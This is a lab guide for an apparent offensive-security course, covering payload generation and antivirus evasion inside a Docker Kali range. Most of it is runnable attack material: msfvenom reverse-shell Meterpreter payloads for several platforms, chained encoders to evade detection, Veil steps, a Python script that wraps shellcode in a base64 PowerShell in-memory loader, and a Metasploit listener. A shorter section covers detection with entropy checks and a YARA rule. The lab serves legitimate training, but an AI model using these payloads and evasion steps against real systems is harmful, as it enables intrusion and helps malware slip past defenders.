# Lab 6: Undetectable Payloads & Evasion

## Overview

Lab 6 teaches payload generation, obfuscation, and evasion techniques to bypass security controls. Students will learn to create undetectable payloads, understand antivirus evasion, and implement sophisticated payload delivery mechanisms.

## Requirements

- Docker Engine 24.0+
- Docker Compose 2.0+
- 3GB RAM minimum (5GB recommended)
- 8GB free disk space

## Architecture

```
┌──────────────────────────────────────────┐
│        Docker Network (172.18.6.0/24)    │
├──────────────────────────────────────────┤
│  Kali Linux (172.18.6.10)                │
│  ├── Metasploit Framework                │
│  ├── Veil Evasion Framework              │
│  ├── msfvenom Payload Generator          │
│  ├── Custom Obfuscation Tools            │
│  ├── Compiler Toolchain (mingw-w64)      │
│  └── Reverse Engineering Tools           │
└──────────────────────────────────────────┘
```

## Quick Start

### 1. Start the Lab

```bash
cd lab6
docker-compose up -d
```

### 2. Connect to Kali

```bash
docker-compose exec kali /bin/bash
```

### 3. Verify tools

```bash
msfvenom --version
veil --version
msfconsole --version
```

## Learning Objectives

By the end of this lab, students will be able to:

- ✓ Generate custom payloads with msfvenom
- ✓ Understand payload encoding and obfuscation
- ✓ Use Veil Evasion Framework
- ✓ Bypass antivirus detection
- ✓ Implement polymorphic payloads
- ✓ Create staged and stageless payloads
- ✓ Document evasion techniques

## Exercises

### Exercise 1: msfvenom Payload Generation

**Objective**: Generate common payload types

From Kali container:

```bash
# 1. Generate Windows reverse shell (exe)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=172.18.6.10 LPORT=4444 \
  -f exe -o shell.exe

# 2. Generate Linux reverse shell (elf)
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=172.18.6.10 LPORT=4445 \
  -f elf -o shell.elf

# 3. Generate Android payload (apk)
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=172.18.6.10 LPORT=4446 \
  -f apk -o shell.apk

# 4. Generate PHP web shell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=172.18.6.10 LPORT=4447 \
  -f raw -o shell.php

# 5. Generate Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=172.18.6.10 LPORT=4448 \
  -f raw -o shell.py
```

### Exercise 2: Payload Encoding & Obfuscation

**Objective**: Encode payloads to evade antivirus

```bash
# 1. Generate payload with encoding
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=172.18.6.10 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o shell_encoded.exe

# 2. Multi-encoder chain
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=172.18.6.10 LPORT=4444 \
  -e x86/shikata_ga_nai \
  -e x86/jmp_call_additive \
  -e x86/call_+4 \
  -i 10 \
  -f exe -o shell_multi_encoded.exe

# 3. List available encoders
msfvenom -l encoders

# 4. Generate with format conversion
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=172.18.6.10 LPORT=4444 \
  -f powershell -o shell.ps1
```

### Exercise 3: Veil Evasion Framework

**Objective**: Use advanced evasion techniques

```bash
# Start Veil
veil

# In Veil menu:
1. evasion
2. 1  (select c payloads)
3. 8  (select meterpreter stager)
4. Set LHOST: 172.18.6.10
5. Set LPORT: 4444
6. Generate
```

### Exercise 4: Custom Payload Obfuscation

**Objective**: Create custom obfuscated payloads

Create file `obfuscate_payload.py`:

```python
#!/usr/bin/env python3

import base64
import random
import string

def generate_random_vars(count=5):
    """Generate random variable names"""
    return [''.join(random.choices(string.ascii_letters, k=8)) 
            for _ in range(count)]

def xor_encode(data, key):
    """Simple XOR encoding"""
    return bytes([b ^ key for b in data])

def base64_wrapper(shellcode):
    """Wrap shellcode in base64"""
    encoded = base64.b64encode(shellcode).decode()
    
    var_names = generate_random_vars(10)
    
    powershell_script = f"""
$Var1 = [System.Convert]::FromBase64String('{encoded}')
$Var2 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Var1.Length)
[System.Runtime.InteropServices.Marshal]::Copy($Var1, 0, $Var2, $Var1.Length)
$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Var2, [type]'delegate* unmanaged<void>')
& $delegate
    """
    
    return powershell_script

if __name__ == "__main__":
    # Read shellcode
    with open('shell.bin', 'rb') as f:
        shellcode = f.read()
    
    # Generate obfuscated version
    obfuscated = base64_wrapper(shellcode)
    
    with open('shell_obfuscated.ps1', 'w') as f:
        f.write(obfuscated)
    
    print("[+] Obfuscated payload written to shell_obfuscated.ps1")
```

Run the script:

```bash
python3 obfuscate_payload.py
```

### Exercise 5: Analyze Payload Detection

**Objective**: Understand antivirus detection

```bash
# 1. Check VirusTotal (if internet available)
curl -X POST 'https://www.virustotal.com/api/v3/files' \
  -H "x-apikey: YOUR_API_KEY" \
  -F "file=@shell.exe"

# 2. Analyze with strings
strings shell.exe | grep -i "meterpreter\|reverse"

# 3. Use objdump to disassemble
objdump -D shell.elf | head -50

# 4. Check entropy (polymorphic detection)
python3 << 'EOF'
import math
data = open('shell.exe', 'rb').read()
entropy = -sum((data.count(byte) / len(data)) * math.log2(data.count(byte) / len(data)) 
               for byte in set(data))
print(f"Entropy: {entropy:.2f}")
print("High entropy = likely compressed/encrypted (evasion)")
EOF

# 5. Create signature pattern
sha256sum shell.exe
md5sum shell.exe
```

### Exercise 6: Staged vs Stageless Payloads

**Objective**: Understand payload staging

```bash
# 1. Stageless payload (larger but complete)
msfvenom -p windows/meterpreter_reverse_tcp \
  LHOST=172.18.6.10 LPORT=4444 \
  -f exe -o stageless.exe

# 2. Staged payload (smaller, requires handler)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=172.18.6.10 LPORT=4444 \
  -f exe -o staged.exe

# 3. Compare sizes
ls -lh stageless.exe staged.exe

# 4. Set up listener in Metasploit
msfconsole << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.18.6.10
set LPORT 4444
run
EOF
```

## Evasion Techniques

### 1. Encoding & Polymorphism

- **Shikata ga nai**: Polymorphic XOR encoder
- **jmp_call_additive**: Uses JMP/CALL instructions
- **call_+4**: Encodes payload with CALL instructions
- **fnstenv_mov**: Uses FPU instructions

### 2. Obfuscation

- Base64 encoding
- XOR encryption
- RC4 encryption
- Custom encryption routines

### 3. Delivery Methods

- Archive executables (ZIP, RAR)
- Steganography (hide in images)
- Code signing certificates
- DLL sideloading

### 4. Post-Exploitation Evasion

- Process injection
- DLL Hollowing
- Process hollowing
- Direct syscalls

## Tools Available

### msfvenom

```bash
# List payloads
msfvenom -l payloads | grep -i meterpreter

# List encoders
msfvenom -l encoders

# List formats
msfvenom -l formats | grep -i exe

# Generate and list options
msfvenom -p windows/meterpreter/reverse_tcp --list-options
```

### Veil Evasion

- Generates obfuscated payloads
- Supports multiple languages
- Integrates with Metasploit
- Regularly updated bypass techniques

### Custom Tools

Create custom evasion scripts using:
- Python (pycryptodome for encryption)
- C/C++ (mingw-w64 for Windows compilation)
- PowerShell (native Windows scripting)

## Troubleshooting

### msfvenom not found

```bash
# Install or update
apt-get install metasploit-framework

# Check path
which msfvenom
```

### Encoding fails

```bash
# Use simpler encoder
msfvenom -p windows/shell_reverse_tcp \
  LHOST=172.18.6.10 LPORT=4444 \
  -e x86/jmp_call_additive \
  -i 3 \
  -f exe -o shell.exe
```

### Compilation errors (mingw-w64)

```bash
# Install toolchain
apt-get install mingw-w64

# Compile C payload
x86_64-w64-mingw32-gcc -o shell.exe shell.c
```

## Detection Testing

### Check payload size

```bash
wc -c shell.exe
```

### Check file signatures

```bash
file shell.exe
hexdump -C shell.exe | head -20
```

### Analyze with Yara

```bash
# Create Yara rule
cat > meterpreter.yar << 'EOF'
rule Meterpreter_Signature {
    strings:
        $s1 = "ReflectiveLoader"
        $s2 = "CreateProcessW"
        $s3 = {4D 5A 90 00}  // MZ header
    condition:
        all of them
}
EOF

# Scan payload
yara meterpreter.yar shell.exe
```

## Cleanup

### Stop container

```bash
docker-compose stop
```

### Remove payloads

```bash
rm -rf ./payloads/*
```

### Full cleanup

```bash
docker-compose down -v
```

## Resources

- [MSFVenom Documentation](https://docs.metasploit.com/cli/msfvenom.html)
- [Veil Evasion GitHub](https://github.com/Veil-Framework/Veil)
- [Shellcode Injection Techniques](https://github.com/dliv3/Shellcode-Injection-Techniques)
- [Windows Shellcode Techniques](https://blog.lesnyk.org/2019/04/23/shellcode-101/)

## Success Criteria

You have completed Lab 6 when you can:

- ✓ Generate payloads for multiple platforms
- ✓ Encode payloads with multiple encoder chains
- ✓ Use Veil to create evasion payloads
- ✓ Obfuscate custom payloads
- ✓ Understand AV detection mechanisms
- ✓ Document evasion techniques used
- ✓ Successfully deliver encoded payloads

## Next Steps

After completing Lab 6, you should:

1. Study advanced post-exploitation evasion
2. Practice with Metasploit handlers
3. Move to Lab 7: OT Security (OpenPLC)
4. Learn about ICS/SCADA security

---

**Lab Created**: March 2026  
**Last Updated**: March 2026  
**Status**: Ready for Student Use
